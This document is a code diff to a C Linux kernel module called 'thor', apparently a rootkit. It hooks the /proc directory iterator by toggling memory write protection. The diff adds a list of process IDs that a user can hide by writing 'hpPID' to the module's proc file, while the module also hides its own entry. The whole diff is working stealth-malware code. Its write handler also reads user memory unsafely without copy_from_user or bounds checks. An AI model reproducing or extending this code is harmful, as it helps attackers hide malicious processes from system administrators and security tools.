@@ -23,7 +23,11 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer, size
 static void procfile_cleanup(void);
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
-
+// ------------------------------------------------------------ DEFINITIONS
+struct _pid_list {
+    char *name;
+    struct list_head list;
+};
 // ------------------------------------------------------------ GLOBALS
 static struct proc_dir_entry *procfile;
 static struct proc_dir_entry *procroot;
@@ -38,6 +42,7 @@ static struct file_operations procfile_fops = {
     .llseek = seq_lseek,
     .release = single_release,
 };
+struct _pid_list pid_list;
 // ------------------------------------------------------------ HELPERS
 static void set_addr_rw(void *addr)
 {
@@ -91,14 +96,17 @@ static int __init prochidder_init(void)
     proc_fops->iterate = thor_proc_iterate;
     set_addr_ro(proc_fops);
 
+    INIT_LIST_HEAD(&pid_list.list);
+
     return 0;
 }
 
 // ------------------------------------------------------------ PROCFILE
 static int procfile_read(struct seq_file *m, void *v)
 {
-    // TODO print usage
-    seq_printf(m, "Hello proc!\n");
+    seq_printf(m, 
+        "usage:\n"\
+        "   echo hpPID > /proc/" THOR_PROCFILE " (hides process PID)\n");
     return 0;
 }
 
@@ -110,7 +118,16 @@ static int procfile_open(struct inode *inode, struct file *file)
 static ssize_t procfile_write(struct file *file, const char __user *buffer,
         size_t count, loff_t *ppos)
 {
-    // TODO compare buffer with builtin
+    struct _pid_list *tmp;
+    if(0 == strncmp(buffer, "hp", 2))
+    {
+        tmp = (struct _pid_list*)kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
+        tmp->name = (char*)kmalloc(count-2, GFP_KERNEL);
+        memcpy(tmp->name, buffer+2, count-2);
+        tmp->name[count-3] = 0;
+        LOG_DEBUG("a:%s",tmp->name);
+        list_add(&(tmp->list), &(pid_list.list));
+    }
     return count;
 }
 
@@ -128,6 +145,13 @@ static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
+    struct _pid_list *tmp;
+    // hide specified PIDs
+    list_for_each_entry(tmp, &(pid_list.list), list)
+    {
+        if(0 == strcmp(name, tmp->name)) return 0;
+    }
+    // hide thor itself
     if (0 == strcmp(name, THOR_PROCFILE)) return 0;
     return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
@@ -135,6 +159,9 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t of
 // ------------------------------------------------------------ CLEANUP
 static void __exit thor_cleanup(void)
 {
+    struct _pid_list *tmp;
+    struct list_head *pos, *q;
+
     procfile_cleanup();
 
     if(NULL != proc_fops && NULL != orig_proc_iterate)
@@ -142,6 +169,14 @@ static void __exit thor_cleanup(void)
         set_addr_rw(proc_fops);
         proc_fops->iterate = orig_proc_iterate;
         set_addr_ro(proc_fops);
+    }
+
+    list_for_each_safe(pos, q, &(pid_list.list))
+    {
+        tmp = list_entry(pos, struct _pid_list, list);
+        list_del(pos);
+        kfree(tmp->name);
+        kfree(tmp);
     }
 
     LOG_INFO("cleanup done");
